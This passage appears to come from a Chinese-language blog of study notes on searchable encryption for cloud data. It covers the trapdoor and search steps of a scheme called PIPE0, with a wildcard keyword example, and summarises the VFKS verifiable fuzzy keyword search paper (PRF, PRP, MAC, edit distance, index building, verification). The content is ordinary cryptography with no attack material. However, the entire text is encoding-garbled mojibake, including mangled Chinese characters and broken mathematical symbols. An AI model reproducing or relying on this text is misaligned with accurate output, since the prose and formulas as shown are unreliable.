ã€‚\n\n#### é™·é—¨ç”Ÿæˆç®—æ³•\n\nT<sub>Q<sub>j</sub></sub> â† Trapdoor<sub>0</sub>(W'<sub>j</sub>, SK) ç”Ÿæˆé™·é—¨ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š\n\n- å…·æœ‰ n<sub>i</sub> å…³é”®å­—çš„æŸ¥è¯¢ Q<sub>j</sub> æ–‡ä»¶çš„å…³é”®å­—é›†åˆ W'<sub>i</sub> = {W'<sub>i,1</sub>ï¼Œ . .ï¼Œ w'<sub>i,n<sub>j</sub></sub>}ï¼Œäº‘ç”¨æˆ·æ„å»º n<sub>i</sub> Ã— d çŸ©é˜µ B<sub>i</sub>\n  - 1)å¯¹äºk âˆˆ [n<sub>j</sub>]ï¼Œè¿è¡Œ**ç®—æ³•2**ä¸º W'<sub>j</sub> ä¸­çš„ç¬¬ k ä¸ªå…³é”®å­— w'<sub>j,k</sub> è¾“å‡ºdç»´å‘é‡ q<sub>j,k</sub>\n  - 2)å¯¹äºk âˆˆ [n<sub>j</sub>]ï¼Œè®¾ç½® A<sub>i</sub>\\[k]\\[âˆ—] â† P<sub>i,k</sub>\n\n- å¯¹äº k âˆˆ [n<sub>j</sub>]ï¼Œè¿è¡Œ KNN.EncQ(B<sub>j</sub>\\[k][âˆ—]ï¼Œsk) åŠ å¯†çŸ©é˜µ B<sub>j</sub> çš„ç¬¬ k è¡Œå¹¶è¾“å‡ºä¸€å¯¹åŠ å¯†å‘é‡ (B'<sub>j<sub>a</sub></sub>\\[k][âˆ—]ï¼ŒB'<sub>j<sub>b</sub></sub>\\[k][âˆ—]) ã€‚é™·é—¨ T<sub>Q<sub>j</sub></sub> è®¾ä¸ºä¸€å¯¹åŠ å¯†çŸ©é˜µ B'<sub>j</sub>= (B'<sub>j<sub>a</sub></sub>ï¼ŒB'<sub>j<sub>b</sub></sub>)\n\n![ç®—æ³•2](https://img.jwt1399.top/img/image-20220324114819057.png)\n\n- ç¬¬ä¸€æ­¥(ç¬¬1-2è¡Œ)å¡«å……æ­¥éª¤å’Œç¬¬äºŒæ­¥(ç¬¬3-4è¡Œ)åˆå§‹åŒ–æ­¥éª¤ä¸ç®—æ³•1ç›¸åŒ\n- ç¬¬ä¸‰æ­¥(ç¬¬5-15è¡Œ)ï¼šå°†æŒ‡å®šçš„ç´ æ•°æ”¾ç½®åœ¨ç´¢å¼•å‘é‡çš„é€‚å½“ä½ç½®ï¼Œå¯¹äºå…³é”®å­— w<sub>j,kÂ </sub>çš„ç¬¬ l ä¸ª å­—ç¬¦ w<sub>j,k</sub>[l]ï¼Œæœ‰ä¸¤ç§æƒ…å†µ:\n  - (1)å¦‚æœ w<sub>j,k</sub>[l] â‰  \"âˆ—\"ï¼Œæ‰§è¡Œ 6-8 è¡Œï¼Œè®¡ç®— pos<sub>l</sub> = F<sub>kf</sub>(w<sub>i,k</sub>[l]) å¹¶å°† q<sub>j,k </sub>[pos<sub>l</sub>] ä¹˜ä»¥ p<sub>l</sub>\n  - (2)å¦‚æœ w<sub>j,k</sub>[l] = \"âˆ—\"ï¼Œè¡¨ç¤ºåœ¨ A âˆª S ä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦éƒ½å¯èƒ½ä½äºå…³é”®å­—çš„ç¬¬ l ä½ã€‚\n    - æ‰§è¡Œ 10-15 è¡Œï¼Œè®¡ç®— 1 â‰¤ i â‰¤ 26 çš„ pos<sub>li</sub> = F<sub>kf</sub>(A[i]) å’Œ 26 < i â‰¤ 26 + L çš„ pos<sub>li</sub> = F<sub>kf</sub>(S[iâˆ’26])\n    - å¹¶å°† x âˆˆ [1ï¼Œ26 + L] çš„ q<sub>j,k</sub>[pos<sub>lx</sub>] ä¹˜ä»¥ p<sub>l</sub>\n- ç¬¬å››æ­¥(ç¬¬16è¡Œ)ï¼šä¸ºäº†å¢åŠ å†…ç§¯ç»“æœçš„éšæœºæ€§ï¼Œç”¨éšæœºæ•° z âˆˆ [d- 26 - L] å¡«å……å‰©ä½™éƒ¨åˆ†å…ƒç´ ã€‚\n\n#### æœç´¢ç®—æ³•\n\n**{0,1} â† Search<sub>0</sub>(I<sub>i</sub>,T<sub>Q<sub>j</sub></sub>) **æœç´¢ç®—æ³•ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š\n\n- äº‘æœåŠ¡å•†è®¡ç®—ï¼šR<sub>i,jÂ </sub>= A'<sub>i<sub>a</sub></sub> â‹† B'<sub>j<sub>a</sub></sub> + A'<sub>i<sub>b</sub></sub> â‹† B'<sub>j<sub>b</sub></sub> = A<Sub>i</sub> â‹† B<sub>j</sub>\n- å¯¹äº AND æŸ¥è¯¢ï¼Œå¦‚æœ R<sub>i,j </sub> æ¯åˆ—ä¸­è‡³å°‘æœ‰ä¸€ä¸ªæ•´æ•°ï¼Œåˆ™è¾“å‡º1 ï¼Œå¦åˆ™è¾“å‡º0\n- å¯¹äº OR æŸ¥è¯¢ï¼Œå¦‚æœ R<sub>i,j </sub> è‡³å°‘æœ‰ä¸€ä¸ªæ•´æ•°ï¼Œåˆ™è¾“å‡º1ï¼Œå¦åˆ™è¾“å‡º0\n\n- Remark 1ï¼šâ€œé™¤æ³•â€æ“ä½œå¯èƒ½ä¼šå¯¼è‡´æœç´¢ç²¾åº¦çš„é™ä½ï¼Œä»è€Œå½±å“æœç´¢ç²¾åº¦ã€‚å› æ­¤ï¼Œ1/3Ã—3çš„ç»“æœå¯èƒ½æ˜¯1.00001è€Œä¸æ˜¯1ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬çš„æ–¹æ³•æ˜¯åœ¨å°æ•°ç‚¹åçš„ç¬¬ x ä½è¿›è¡Œå››èˆäº”å…¥ï¼Œx å¯ä»¥åœ¨å®éªŒä¸­è°ƒä¼˜ã€‚\n\næ —å­ğŸŒ°ï¼š\n\n- PIPE0çš„å·¥ä½œè¿‡ç¨‹\n\n![PIPE0çš„å·¥ä½œè¿‡ç¨‹](https://img.jwt1399.top/img/image-20220324145549054.png)\n\n- ç”±ç®—æ³•1å’Œç®—æ³•2è¾“å‡ºçš„æ ·æœ¬å‘é‡\n  - äº‘ç”¨æˆ·å‘å‡ºæŸ¥è¯¢ Q<sub>1</sub> = {\"helâˆ—o\"ï¼Œ\"kâˆ—y\"} å’Œ Q<sub>2</sub> = {\"helâˆ—o\"ï¼Œ\"wâˆ—râˆ—d\"} æ¥æ£€ç´¢é€‚å½“çš„æ–‡ä»¶ã€‚\n  - ç»™å®šå…³é”®å­—æœ€å¤§é•¿åº¦ L= 5ï¼Œéšæœºç´ æ•° P = (3,5,7,11,13)ï¼Œè™šæ‹Ÿå­—ç¬¦ S = (\"A\"ï¼Œ \"B\"ï¼Œ \"C\"ï¼Œ \"D\"ï¼Œ \"E\")ï¼Œæ„å»ºç´¢å¼•/æŸ¥è¯¢å‘é‡ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚\n\n![](https://img.jwt1399.top/img/image-20220324145811133.png)\n\nä¸ºäº†è¯´æ˜å‘é‡ç¼–ç ç®—æ³•çš„å·¥ä½œè¿‡ç¨‹ï¼Œæˆ‘ä»¬ä»¥ç´¢å¼•å…³é”®å­— â€œkeyâ€ å’ŒæŸ¥è¯¢å…³é”®å­— â€œkâˆ—yâ€ ä¸ºä¾‹ã€‚\n\n- åœ¨ç¬¬ä¸€æ­¥ä¸­ï¼Œå°†ç”¨å­—ç¬¦ â€œAâ€ å’Œ â€œBâ€ å¡«å……ä¸¤ä¸ªå…³é”®å­—ï¼Œä½¿å…¶æœ€å¤§é•¿åº¦ä¸º 5\n- åœ¨ç¬¬äºŒæ­¥ä¸­ï¼Œä¸¤ä¸ª d ç»´å‘é‡ p<sub>key</sub> å’Œ q<sub>kâˆ—y</sub> è¢«æ„é€ ï¼Œå¹¶ç”¨ 1 åˆå§‹åŒ–ã€‚\n- å¯¹äºç´¢å¼•å…³é”®å­— â€œkeyâ€ï¼Œç´ æ•°çš„å€’æ•°æ”¾ç½®å¦‚ä¸‹:\n  - å› ä¸ºâ€œkâ€æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œp<sub>key</sub>[F<sub>k<sub>f</sub></sub>(k)] è¦ä¹˜ä»¥ 1/3ï¼›\n  - å› ä¸ºâ€œeâ€æ˜¯ç¬¬äºŒä¸ªå­—ç¬¦ï¼Œp<sub>key</sub>[F<sub>k<sub>f</sub></sub>(e)] å°†è¢«ä¹˜ä»¥ 1/5;\n  - å› ä¸ºâ€œyâ€æ˜¯ç¬¬ä¸‰ä¸ªå­—ç¬¦ï¼Œp<sub>key</sub>[F<sub>k<sub>f</sub></sub>(y)] å°†è¢«ä¹˜ä»¥ 1/7;\n  - å› ä¸ºâ€œAâ€æ˜¯ç¬¬å››ä¸ªå­—ç¬¦ï¼Œp<sub>key</sub>[F<sub>k<sub>f</sub></sub>(A)] å°†è¢«ä¹˜ä»¥ 1/11;\n  - å› ä¸ºâ€œBâ€æ˜¯ç¬¬äº”ä¸ªå­—ç¬¦ï¼Œp<sub>key</sub>[F<sub>k<sub>f</sub></sub>(B)] è¦ä¹˜ä»¥ 1/13ã€‚\n- å¯¹äºæŸ¥è¯¢å…³é”®å­— â€œkâˆ—yâ€ï¼Œç´ æ•°çš„æ”¾ç½®æ–¹å¼å¦‚ä¸‹:\n  - å› ä¸ºâ€œkâ€æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥ q<sub>kâˆ—y</sub>[F<sub>k<sub>f</sub></sub>(k)] å°†ä¹˜ä»¥3;\n  - ç”±äºâ€œâˆ—â€æ˜¯ç¬¬äºŒä¸ªå­—ç¬¦ï¼ŒA å’Œ S ä¸­çš„ä»»æ„å…ƒç´ éƒ½å¯ä»¥ä½äºè¿™ä¸ªä½ç½®ï¼Œå¹¶ä¸” q<sub>kâˆ—y</sub>[F<sub>k<sub>f</sub></sub>(a)]ï¼Œâ€¦ ï¼Œq<sub>kâˆ—y</sub>[F<sub>k<sub>f</sub></sub>(E)] å°†ä¹˜ä»¥ 5;\n  - å› ä¸ºâ€œyâ€æ˜¯ç¬¬ä¸‰ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥ q<sub>kâˆ—y</sub>[F<sub>k<sub>f</sub></sub>(y)] å°†ä¹˜ä»¥ 7;\n  - å› ä¸ºâ€œAâ€æ˜¯ç¬¬å››ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥ q<sub>kâˆ—y</sub>[F<sub>k<sub>f</sub></sub>(A)] å°†ä¹˜ä»¥ 11;\n  - å› ä¸ºâ€œBâ€æ˜¯ç¬¬äº”ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥ q<sub>kâˆ—y</sub>[F<sub>k<sub>f</sub></sub>(B)] å°†ä¹˜ä»¥ 13ã€‚\n\nç”±äºç´ æ•°çš„ä¸å¯åˆ†è§£æ€§è´¨ï¼Œp<sub>key</sub> Â· q<sub>kâˆ—yÂ </sub>çš„ç»“æœæ˜¯ä¸€ä¸ªæ•´æ•°(ç­‰äº21)ã€‚ç»“æœä¸ä¸¤ä¸ªå…³é”®å­—ç›¸ä¼¼æ˜¯ä¸€è‡´çš„\n\nä¸Šå›¾æ‰€ç¤ºçš„ç´¢å¼•/æŸ¥è¯¢å‘é‡ï¼Œç›¸åº”çš„æ ·æœ¬çŸ©é˜µå¦‚å›¾[PIPE0çš„å·¥ä½œè¿‡ç¨‹]-(b)æ‰€ç¤º\n\n- å¦‚æœ Q<sub>1</sub> æ˜¯ä¸€ä¸ª AND æŸ¥è¯¢ï¼Œå°†è¿”å› D<sub>1</sub>ï¼Œå› ä¸ºåªæœ‰ R<sub>1,1</sub> åœ¨æ¯åˆ—ä¸­æœ‰ä¸€ä¸ªæ•´æ•°å…ƒç´ ;\n- å¦‚æœ Q<sub>1</sub> æ˜¯ä¸€ä¸ª OR æŸ¥è¯¢ï¼Œ{D<sub>1</sub>, D<sub>2</sub>, D<sub>3</sub>} å°†è¿”å›ï¼Œå› ä¸º R<sub>1,1</sub>, R<sub>2,1</sub> å’Œ R<sub>3,1</sub> è‡³å°‘æœ‰ä¸€ä¸ªæ•´æ•°å…ƒç´ ã€‚\n- å¦‚æœ Q<sub>2</sub> æ˜¯ä¸€ä¸ª AND æŸ¥è¯¢ï¼Œå°†è¿”å› D<sub>3</sub>ï¼Œå› ä¸ºåªæœ‰ R<sub>3,2</sub> åœ¨æ¯åˆ—ä¸­æœ‰ä¸€ä¸ªæ•´æ•°å…ƒç´ \n- å¦‚æœ Q<sub>2</sub> æ˜¯ä¸€ä¸ª OR æŸ¥è¯¢ï¼Œ{D<sub>1</sub>, D<sub>3</sub>} å°†è¢«è¿”å›ï¼Œå› ä¸º R<sub>1,2</sub> å’Œ R<sub>3,2</sub> è‡³å°‘æœ‰ä¸€ä¸ªæ•´æ•°å…ƒç´ ã€‚\n\n## â‘§VFKSæ–¹æ¡ˆ\n\n**è®ºæ–‡åç§°ï¼šã€ŠEnabling Efficient Verifiable Fuzzy KeywordSearch Over Encrypted Data in Cloud Computingã€‹**\n\n- ä½œè€…ï¼šè‘›æ–°ç‘; è´¾å®‡; èƒ¡æˆå®‡; å¼ æ±‰æ—; è£æµ©\n- å•ä½ï¼šé’å²›å¤§å­¦\n- åˆŠç‰©ï¼š[IEEE Access](http://ieeexplore-ieee-org-s.vpn.uestc.edu.cn:8118/document/8438878)\n- æ—¶é—´ï¼š2018å¹´08æœˆ\n\n### 1ã€æ€»ä½“æ€è·¯\n\næœ¬æ–‡æå‡ºäº†**ä¸€ç§åŸºäºåŠ å¯†äº‘æ•°æ®çš„æ–°å‹å¯éªŒè¯æ¨¡ç³Šå…³é”®å­—æœç´¢æ–¹æ¡ˆ**ï¼ˆVFKSï¼‰ã€‚ä¸ºäº†å¼•å…¥è¯¥æ–¹æ¡ˆï¼Œé¦–å…ˆæå‡ºä¸€ä¸ª**å¯éªŒè¯çš„ç¡®åˆ‡å…³é”®å­—æœç´¢æ–¹æ¡ˆ**ï¼Œç„¶åå°†è¯¥æ–¹æ¡ˆæ‰©å±•åˆ°**æ¨¡ç³Šå…³é”®å­—æœç´¢æ–¹æ¡ˆ**ã€‚åœ¨æ¨¡ç³Šå…³é”®å­—æœç´¢æ–¹æ¡ˆä¸­ï¼Œé‡‡ç”¨**é“¾è¡¨**ä½œä¸ºå®‰å…¨ç´¢å¼•ï¼Œä»¥å®ç°é«˜æ•ˆå­˜å‚¨ã€‚æˆ‘ä»¬ä¸ºæ¯ä¸ªå…³é”®å­—æ„é€ ä¸€ä¸ªåŒ…å«**ä¸‰ä¸ªèŠ‚ç‚¹çš„é“¾è¡¨**ï¼Œå¹¶ä¸ºå…¶ç”Ÿæˆä¸€ä¸ª**æ¨¡ç³Šå…³é”®å­—é›†**ä¸ºäº†é™ä½è®¡ç®—æˆæœ¬å’Œå­˜å‚¨ç©ºé—´ï¼Œæˆ‘ä»¬ä¸ºæ¯ä¸ªæ¨¡ç³Šå…³é”®å­—é›†ç”Ÿæˆä¸€ä¸ª**ç´¢å¼•å‘é‡**ï¼Œè€Œä¸æ˜¯æ¯ä¸ªæ¨¡ç³Šå…³é”®å­—ã€‚ä¸ºäº†æŠµå¾¡äº‘æœåŠ¡å™¨çš„æ¶æ„è¡Œä¸ºï¼Œä¸ºæ¯ä¸ªæ¨¡ç³Šå…³é”®å­—ç”Ÿæˆä¸€ä¸ª**èº«ä»½éªŒè¯æ ‡ç­¾**ï¼Œä»¥éªŒè¯è¿”å›çš„å¯†æ–‡çš„çœŸå®æ€§ã€‚\n\n### 2ã€ä½¿ç”¨æŠ€æœ¯\n\n- PRFã€PRP\n- MAC\n- å€’æ’ç´¢å¼•\n- ç¼–è¾‘è·ç¦»ï¼ˆLevenshteinï¼‰\n- é“¾è¡¨\n\n### 3ã€åŸºç¡€çŸ¥è¯†\n\n#### å®‰å…¨ç´¢å¼•\n\næ•°æ®æ‰€æœ‰è€…å°†æ™®é€šç´¢å¼•åŠ å¯†ä¸ºå®‰å…¨ç´¢å¼•ã€‚ä»–åˆ©ç”¨ PRP Ï€ æ··æ·†å…³é”®å­—çš„é‡æ–°åˆ†é…ï¼Œå¹¶åˆ©ç”¨ PRF f æ¨¡ç³Šå‘é‡ v(w<sub>i</sub>)ï¼Œå³ Ï€<sub>k1</sub>(w<sub>i</sub>) å’Œ Ev(w<sub>i</sub>)â†f<sub>k2</sub>(Ï€k1(w<sub>i</sub>)) âŠ• v(w<sub>i</sub>)ã€‚æ•°æ®æ‰€æœ‰è€…è°ƒç”¨ç®—æ³• SKE.Enc å°†æ–‡ä»¶ F åŠ å¯†æˆå¯†æ–‡ C ã€‚ä½¿ç”¨ ID(C<sub>j</sub>) è¡¨ç¤ºåŠ å¯†æ–‡ä»¶ C<sub>j</sub> çš„æ ‡è¯†ç¬¦\n\n#### PRFã€PRP\n\nä¼ªéšæœºå‡½æ•°ï¼ˆPRFï¼špseudo random functionï¼‰å’Œä¼ªéšæœºç½®æ¢å‡½æ•°ï¼ˆPRPï¼špseudo random permutationï¼‰æ˜¯å¤šé¡¹å¼æ—¶é—´å¯è®¡ç®—å‡½æ•°ï¼Œä»»ä½•æ¦‚ç‡å¤šé¡¹å¼æ—¶é—´å¯¹æ‰‹éƒ½æ— æ³•å°†å…¶ä¸éšæœºå‡½æ•°åŒºåˆ†å¼€æ¥ã€‚\n\næ–‡ç« ä¸­ä½¿ç”¨ **PRF f** æ¥åŠ å¯†ç´¢å¼•å‘é‡(blind the index vectors )ï¼Œä½¿ç”¨ **PRP Ï€** æ¥æ··æ·†å…³é”®å­—çš„ä½ç½®ã€‚ä¸¤ä¸ªå‡½æ•°çš„å‚æ•°å¦‚ä¸‹ï¼š\n\n- Ï€ï¼š{0,1}<sup>k</sup> Ã— {0,1}<sup>l</sup> â†’ {0,1}<sup>l</sup>\n- fï¼š {0,1}<sup>k</sup> Ã— {0,1}<sup>lÂ </sup>â†’ {0,1}<sup>N</sup>\n- å…¶ä¸­ l æ˜¯å…³é”®å­—çš„æœ€é•¿é•¿åº¦ã€‚\n\n#### MAC\n\nMAC æ˜¯æŒ‡æ¶ˆæ¯è®¤è¯ç ï¼ˆå¸¦å¯†é’¥çš„Hashå‡½æ•°ï¼‰ï¼Œæ˜¯å¯†ç å­¦ä¸­é€šä¿¡å®ä½“åŒæ–¹ä½¿ç”¨çš„ä¸€ç§éªŒè¯æœºåˆ¶ï¼Œä¿è¯æ¶ˆæ¯æ•°æ®å®Œæ•´æ€§çš„ä¸€ç§å·¥å…·ã€‚æ„é€ æ–¹æ³•ç”± M.Bellare æå‡ºï¼Œå®‰å…¨æ€§ä¾èµ–äº Hash å‡½æ•°ï¼Œæ•…ä¹Ÿç§°å¸¦å¯†é’¥çš„ Hash å‡½æ•°ã€‚æ¶ˆæ¯è®¤è¯ç æ˜¯åŸºäºå¯†é’¥å’Œæ¶ˆæ¯æ‘˜è¦æ‰€è·å¾—çš„ä¸€ä¸ªå€¼ï¼Œå¯ç”¨äºæ•°æ®æºå‘é€æ–¹è®¤è¯å’Œå®Œæ•´æ€§æ ¡éªŒã€‚MAC ä¸€èˆ¬ä¸ä¼šä»å¤´è®¾è®¡ï¼Œè€Œæ˜¯ä»å·²æœ‰çš„å“ˆå¸Œå‡½æ•°æ”¹é€ è€Œæ¥ï¼Œæ¯”å¦‚åŠ å‰ç¼€ã€åç¼€æˆ–å…¶ä»–æ–¹æ³•ã€‚\n\n- è®¾ MACï¼š{0,1}<sup>k</sup> Ã— {0,1}<sup>âˆ—</sup>â†’{0,1}<sup>N</sup> æ˜¯ä¸€ä¸ªè®¤è¯æ ‡ç­¾ç”Ÿæˆå‡½æ•°\n\n- å¯¹äºæ‰€é€‰çš„æ¶ˆæ¯æ”»å‡»å…·æœ‰ä¸å¯é€†æ€§å’Œæ¶ˆæ¯ä¸å¯ä¼ªé€ æ€§ï¼Œæˆ‘ä»¬ç”¨å®ƒä¸ºæ¶ˆæ¯ç”Ÿæˆä¸€ä¸ªè®¤è¯æ ‡ç­¾ï¼Œå¹¶éªŒè¯ä»äº‘æœåŠ¡å™¨è¿”å›çš„æœç´¢ç»“æœçš„æ­£ç¡®æ€§ã€‚\n\n- åœ¨æœ¬æ–‡ä¸­ä½¿ç”¨ tag = MAC(k<sub>0</sub>,m) ä»£æ›¿ tag = MAC(m)ï¼Œå…¶ä¸­ k<sub>0</sub> ä¸º keyï¼Œm ä¸ºmessage\n\n#### ç¼–è¾‘è·ç¦»\n\nç¼–è¾‘è·ç¦»ï¼Œä¹Ÿå«è±æ–‡æ–¯å¦è·ç¦»(Levenshtein)ï¼Œåœ¨æ¨¡ç³Šå…³é”®å­—æœç´¢æ–¹æ¡ˆä¸­ï¼Œåˆ©ç”¨ç¼–è¾‘è·ç¦»æ¥è¯„ä¼°ä¸¤ä¸ªå­—ç¬¦ä¸²çš„ç›¸ä¼¼åº¦ã€‚ä¸¤ä¸ªå…³é”®å­— w<sub>1</sub> å’Œ w<sub>2</sub> ä¹‹é—´çš„ç¼–è¾‘è·ç¦» (w<sub>1</sub>,w<sub>2</sub>) æ˜¯å°†å…¶ä¸­ä¸€ä¸ªè½¬æ¢ä¸ºå¦ä¸€ä¸ªæ‰€éœ€çš„æœ€å°æ“ä½œæ•°ã€‚æœ‰ä¸‰ç§åŸºæœ¬æ“ä½œ\n\n- æ›¿æ¢ï¼šæŠŠä¸€ä¸ªå­—è½¬æ¢æˆå¦ä¸€ä¸ªå­—ã€‚\n- åˆ é™¤ï¼šä»ä¸€ä¸ªå•è¯ä¸­åˆ é™¤ä¸€ä¸ªå­—æ¯ã€‚\n- æ’å…¥ï¼šåœ¨å•è¯ä¸­æ’å…¥ä¸€ä¸ªå­—æ¯ã€‚\n\nä¾‹å¦‚ï¼Œå°†å…³é”®å­— kitten è½¬æ¢ä¸ºå…³é”®å­— sitting çš„æ“ä½œå¦‚ä¸‹:\n\n- 1ã€kittenâ†’sittenï¼ˆkâ†’sï¼‰\n- 2ã€sittenâ†’sittinï¼ˆeâ†’iï¼‰\n- 3ã€sittinâ†’sittingï¼ˆinsert gï¼‰\n\nä¸€èˆ¬æ¥è¯´ï¼Œç¼–è¾‘è·ç¦»è¶Šå°ï¼Œä¸¤ä¸ªå…³é”®è¯çš„ç›¸ä¼¼åº¦è¶Šå¤§\n\n### 4ã€æ–¹æ¡ˆ1ï¼šVEKS\n\n#### Kâ†KeyGen(1<sup>k</sup>)\n\n- skâ†SKE.Gen(1<sup>k</sup>)\n  - SKE=(Gen,Enc,Dec)ï¼šæ–‡ç« ä¸­ä½¿ç”¨ AES\n\n- k<sub>0</sub>ï¼Œk<sub>1</sub>ï¼Œk<sub>2</sub>â†{0,1}<sup>k</sup>\n- ç®—æ³•è¾“å‡ºç§˜é’¥ K = {skï¼Œk<sub>0</sub>ï¼Œk<sub>1</sub>ï¼Œk<sub>2</sub>}\n- sk ä¸ºåŠ è§£å¯†æ–‡ä»¶çš„å¯†é’¥ï¼Œk<sub>0</sub> ä¸º MAC çš„å¯†é’¥ï¼Œk<sub>1</sub> ä¸º PRP Ï€ çš„å¯†é’¥ï¼Œk<sub>2</sub> ä¸º PRF f çš„å¯†é’¥\n\n#### (I,C)â†BuildIndex(K,F)\n\n![](https://img.jwt1399.top/img/image-20220314172214410.png)\n\n- 1ã€æ•°æ®æ‰€æœ‰è€…æ‰«ææ•´ä¸ªæ–‡æ¡£ï¼Œæå–æ‰€æœ‰ä¸åŒçš„å…³é”®å­—ï¼Œæ„é€ å…³é”®å­—é›† Wã€‚å¯¹äºæ¯ä¸ªå…³é”®å­— w<sub>i</sub> âˆˆ W(1â‰¤iâ‰¤n)ï¼Œæ•°æ®æ‰€æœ‰è€…æ„é€  F(w<sub>i</sub>)ï¼Œå®ƒæ˜¯ä¸€ä¸ªåŒ…å« w<sub>iÂ </sub>çš„æ–‡ä»¶é›†åˆã€‚\n- 2ã€è®¾ v(w<sub>i</sub>)(1â‰¤iâ‰¤n) è¡¨ç¤ºå…³é”®å­— w<sub>i </sub> çš„ç´¢å¼•å‘é‡ã€‚\n  - å¦‚æœ w<sub>i </sub> åœ¨ F<sub>j</sub> (1â‰¤jâ‰¤N) ä¸­ï¼Œåˆ™ v(w<sub>i </sub>)[j] = 1\n  - å¦åˆ™, v(w<sub>i</sub>)[j] = 0\n\n- 3ã€æ•°æ®æ‰€æœ‰è€…é€šè¿‡è®¡ç®— C<sub>i</sub>â†SKE.Enc<sub>sk</sub>(F<sub>i</sub>) åŠ å¯†æ–‡æ¡£ã€‚ç„¶åç”Ÿæˆå…³é”®å­—é™·é—¨ **Ï€<sub>k<sub>1</sub></sub>(w<sub>i</sub>)**ï¼Œé€šè¿‡è®¡ç®— **Ev(w<sub>i</sub>)**â†f<sub>k<sub>2</sub></sub>(Ï€<sub>k<sub>1</sub></sub>(w<sub>i</sub>)) âŠ• v(w<sub>i</sub>) æ¥åŠ å¯†å‘é‡ v(w<sub>i</sub>)ã€‚\n- 4ã€æ•°æ®æ‰€æœ‰è€…è®¡ç®— **tag<sub>w<sub>i</sub></sub>**â†MAC(Ï€<sub>k<sub>1</sub></sub>(w<sub>i</sub>)ï¼ŒEv(w<sub>i</sub>)ï¼ŒC<sub>i</sub>)ï¼Œå¹¶å°†æ‰€æœ‰ tag<sub>w<sub>iÂ </sub></sub>å­˜å‚¨åˆ° tag è¡¨ä¸­\n- 5ã€æœ€åï¼Œæ•°æ®æ‰€æœ‰è€…å°†å®‰å…¨ç´¢å¼• Iã€å¯†æ–‡ C å’Œ tag è¡¨ä¸Šä¼ åˆ°äº‘æœåŠ¡å™¨\n\n#### T<sub>w'</sub>â†Trapdoor(K,w')\n\nå½“ç”¨æˆ·éœ€è¦æœç´¢åŒ…å«å…³é”®å­— w' çš„æ–‡æ¡£æ—¶ï¼Œè®¡ç®—å‡ºé™·é—¨ T<sub>w'</sub> = (Ï€<sub>k1</sub>(w')ï¼Œf<sub>k2</sub>(Ï€<sub>k1</sub>(w')))ï¼Œå¹¶å‘é€åˆ°äº‘æœåŠ¡å™¨\n\n#### ( tag<sub>w'</sub>,C(w'))â†Search(T<sub>w'</sub>,C,I)\n\n- äº‘æœåŠ¡å™¨æ ¹æ® Ï€<sub>k1</sub>(w') åœ¨å®‰å…¨ç´¢å¼• I ä¸­æ‰¾åˆ°ç›¸å…³çš„åŠ å¯†å‘é‡ Ev(w')\n- ç„¶åé€šè¿‡è®¡ç®— v(w') â† f<sub>k2</sub>(Ï€<sub>k1</sub>(w')) âŠ• Ev(w') è§£å¯† Ev(w')\n- å¦‚æœ v(w')[j] = 1 (1â‰¤jâ‰¤N)ï¼Œäº‘æœåŠ¡å™¨å°† C<sub>j</sub> åŠ åˆ° C(w') ä¸­\n- åŒæ—¶ï¼Œäº‘æœåŠ¡å™¨å¯¹ tag è¡¨ä¸­ Ï€<sub>k1</sub>(w') ä½ç½®æå– tag<sub>w'</sub>\n- æœ€åï¼Œäº‘æœåŠ¡å™¨å°† C(w') å’Œ tag<sub>w'Â </sub>è¿”å›ç»™æ•°æ®ç”¨æˆ·ã€‚\n\n#### (accept,reject)â†Verify(K,tag<sub>w'</sub>,C(w'),T<sub>w'</sub>)\n\n- ç”¨æˆ·ä» C(w') ä¸­è§£æå‡º v(w') ï¼Œå¦‚æœ C<sub>j</sub> åœ¨ C(w') ä¸­ï¼Œåˆ™ v(w') çš„ç¬¬ j ä½ä¸º 1ï¼Œå¦åˆ™ç­‰äº 0\n- ç”¨æˆ·è®¡ç®— Ev(w')â†f<sub>k<sub>2</sub></sub>(Ï€<sub>k1</sub>(w')) âŠ• v(w')\n- ç„¶åæ£€æŸ¥ MAC(Ï€<sub>k1</sub>(w')ï¼ŒEv(w')ï¼ŒC(w')) æ˜¯å¦ç­‰äº tag<sub>w'</sub>ï¼Œå¦‚æœæ˜¯åˆ™ç”¨æˆ·æ¥å—ç»“æœï¼Œå¦åˆ™æ‹’ç»ç»“æœã€‚\n\n#### F(w')â†Dec(K,C(w'))\n\nç”¨æˆ·è§£å¯†  C(w') é€šè¿‡è®¡ç®— F(w')â†SKE.Dec<sub>sk</sub> (C(w'))\n\n### 5ã€æ–¹æ¡ˆ2ï¼šVFKS\n\n#### KeyGen(1<sup>k</sup>)\n\n- skâ†SKE.Gen(1<sup>k</sup>)\n- SKE = (Gen,Enc,Dec)ï¼Œæ–‡ç« ä¸­ä½¿ç”¨ AES\n- k<sub>0</sub>ï¼Œk<sub>1</sub>ï¼Œk<sub>2</sub>â†{0,1}<sup>k</sup>\n- ç®—æ³•è¾“å‡ºç§˜é’¥ K = {skï¼Œk<sub>0</sub>ï¼Œk<sub>1</sub>ï¼Œk<sub>2</sub>}\n- sk ä¸ºåŠ è§£å¯†æ–‡ä»¶çš„å¯†é’¥ï¼Œk<sub>0</sub> ä¸º MAC çš„å¯†é’¥ï¼Œk<sub>1</sub> ä¸º PRP Ï€ çš„å¯†é’¥ï¼Œk<sub>2</sub> ä¸º PRF f çš„å¯†é’¥ã€‚\n\n#### BuildIndex(K,F)\n\nä¸ºäº†æ–¹ä¾¿ã€é«˜æ•ˆåœ°å»ºç«‹ç´¢å¼•ï¼Œæ–‡ç« é€šè¿‡**æ‰©å±•å€’æ’ç´¢å¼•**æ¥**æ„é€ åŒ…å«ä¸‰ä¸ªèŠ‚ç‚¹çš„é“¾è¡¨**ä½œä¸º**ç´¢å¼•**ã€‚\n\n![](https://img.jwt1399.top/img/image-20220314184127075.png)\n\n- 